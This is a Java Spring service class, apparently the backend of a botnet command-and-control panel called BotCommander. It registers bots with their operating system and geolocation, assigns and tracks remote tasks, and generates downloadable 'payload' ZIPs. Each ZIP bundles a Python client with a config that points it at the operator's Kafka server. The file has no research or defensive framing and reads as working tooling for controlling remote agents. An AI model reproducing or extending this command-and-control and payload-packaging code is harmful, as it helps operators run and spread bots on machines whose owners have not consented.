package com.giacconidev.botcommander.backend.service;

import java.io.FileOutputStream;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Map;
import java.util.Objects;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Profile;
import org.springframework.core.io.Resource;
import org.springframework.core.io.UrlResource;
import org.springframework.http.HttpHeaders;
import org.springframework.http.ResponseEntity;
import org.springframework.stereotype.Service;

import com.giacconidev.botcommander.backend.dto.BotDto;
import com.giacconidev.botcommander.backend.dto.TaskDto;
import com.giacconidev.botcommander.backend.model.Bot;
import com.giacconidev.botcommander.backend.model.Task;
import com.giacconidev.botcommander.backend.repository.BotRepository;
import com.giacconidev.botcommander.backend.utils.Utils;
import reactor.core.publisher.Flux;

@Service
@Profile("!test")
public class BotService {

    private BotRepository botRepository;

    // spring.kafka.consumer.bootstrap-servers variable
    @Value("${spring.kafka_payload_url}")
    private String kafkaPayloadUrl;

    private ArrayList<String> bannedFiles = null;

    /**
     * Constructor for BotService.
     * 
     * @param botRepository the repository to interact with the database
     */
    public BotService(BotRepository botRepository) {
        this.botRepository = botRepository;
        // Initialize the banned files list
        // This list contains files that should not be included in the ZIP file
        // when generating payloads
        this.bannedFiles = new ArrayList<>(Arrays.asList("config.txt", "myenv", ".env", "__pycache__"));
    }

    private static final Logger logger = LoggerFactory.getLogger(BotService.class);

    /**
     * Retrieves all bots from the database and maps them to BotDto objects.
     * 
     * @return a Flux of BotDto representing all bots
     */
    public Flux<BotDto> getAllBots() {
        return botRepository.findAll().map(BotDto::new)
                .doOnError(error -> logger.error("Failed to get bots from db: " + error.getMessage()));
    }

    /**
     * Adds a new task to the bot with the given botId.
     * 
     * @param botId the ID of the bot
     * @param input the TaskDto containing the task details
     * @return a BotDto representing the updated bot, or null if the bot does not
     *         exist
     */
    public BotDto addNewTaskToBot(String botId, TaskDto input) {
        // find bot by id
        Bot bot = botRepository.findById(botId).block();
        if (Objects.nonNull(bot)) {
            // limit to 15 tasks in db for each bot, rolling the old ones if necessary
            if (bot.getTasks().size() >= 15)
                bot.getTasks().remove(0);
                
            // add new task to bot
            Task task = new Task(input.getId(), input.getActionType(), input.getParameters(), input.getResult());
            bot.getTasks().add(task);
            // save bot
            return new BotDto(botRepository.save(bot).block());
        }
        return null;
    }

    /**
     * Initializes or refreshes a bot with the given botId, os, and name.
     * If the bot already exists, it updates the last signal time, os, and name.
     * If the bot does not exist, it creates a new bot with the provided details.
     * 
     * @param botId the ID of the bot
     * @param os    the operating system of the bot
     * @param name  the name of the bot
     * @return a BotDto representing the initialized or refreshed bot
     */
    public BotDto InitializeOrRefreshBot(BotDto botDto) {
        Bot bot = botRepository.findById(botDto.getId()).block();
        if (Objects.nonNull(bot)) {
            // Refresh data
            bot.refreshData(botDto);
            // Save bot
            botRepository.save(bot).block();
        } else {
            // Create new bot
            bot = new Bot(botDto);
            // Save bot
            botRepository.save(bot).block();
        }
        return new BotDto(bot);
    }

    /**
     * Deletes the bot with the given botId from the database.
     * 
     * @param botId the ID of the bot to delete
     */
    public void deleteBot(String botId) {
        botRepository.deleteById(botId).block();

    }

    /**
     * Updates the task in the bot with the given botId and taskId.
     * 
     * @param botId  the ID of the bot
     * @param taskId the ID of the task to update
     * @param result the result to set for the task
     */
    public void updateTaskInBot(String botId, String taskId, String result) {
        Bot bot = botRepository.findById(botId).block();
        if (Objects.nonNull(bot)) {
            // find task by id
            Task task = bot.getTasks().stream().filter(t -> t.getId().equals(taskId)).findFirst().orElse(null);
            if (Objects.nonNull(task)) {
                // update task result
                task.setResult(result);
            }
            // refresh last signal
            bot.setLastSignal(Instant.now());

            // if task was to refresh geolocation we set as new bot geolocation
            if ("geolocation".equals(task.getActionType())) {
                bot.setGeolocation(result);
                botRepository.save(bot).block();
            }

            // save bot
            botRepository.save(bot).block();
        }
    }

    /**
     * Returns the URL of the Kafka consumer bootstrap server.
     * 
     * @return the URL of the Kafka consumer bootstrap server
     */
    public String getPayloadUrl() {
        return kafkaPayloadUrl;
    }

    /**
     * Updates the list of bots in the database.
     * 
     * @param bots the list of bots to update
     */
    public void updateBots(List<Bot> bots) {
        botRepository.saveAll(bots).blockLast();
    }

    /**
     * Generates a downloadable ZIP file containing the payload for the specified
     * parameters.
     * 
     * @param params a map containing the payload type and payload target URL
     * @return a ResponseEntity containing the ZIP file as a downloadable resource
     */
    public ResponseEntity<?> getPayloadDownload(Map<String, String> params) {
        if (params.get("payloadType") == null || params.get("payloadType").isEmpty()) {
            return ResponseEntity.badRequest().body("Payload type is required");
        }
        if (params.get("payloadUrl") == null || params.get("payloadUrl").isEmpty()) {
            return ResponseEntity.badRequest().body("Payload URL is required");
        }
        // Download the payload
        try {

            // Create a ZIP file in the temporary directory
            Path zipFilePath = Files.createTempFile("python-payload", ".zip");

            // Zip the Python project
            try (ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFilePath.toFile()))) {
                // Copy the Python project files to the ZIP
                Utils.copyFolderToZip(params.get("payloadType") + "-project", this.bannedFiles, zos);
                // Add the config file to the ZIP
                addConfigEntryToZip(params, zos);
            } finally {
                // Clean up the temporary file on exit
                zipFilePath.toFile().deleteOnExit();
            }

            // Serve the ZIP file as a downloadable response
            Resource resource = new UrlResource(zipFilePath.toUri());
            return ResponseEntity.ok()
                    .header(HttpHeaders.CONTENT_DISPOSITION, "attachment; filename=\"" + resource.getFilename() + "\"")
                    .body(resource);

        } catch (Exception e) {
            throw new RuntimeException("Error: " + e.getMessage());
        }
    }

    private void addConfigEntryToZip(Map<String, String> params, ZipOutputStream zos) throws IOException {
        String configContent = "bootstrap_servers=" + params.get("payloadUrl") + "\n" +
                "topic=apps";
        // Add a file called config file to the ZIP
        ZipEntry configEntry = new ZipEntry("config.txt");
        // add configContent content to the config file
        zos.putNextEntry(configEntry);
        zos.write(configContent.getBytes());
        zos.closeEntry();
    }

}
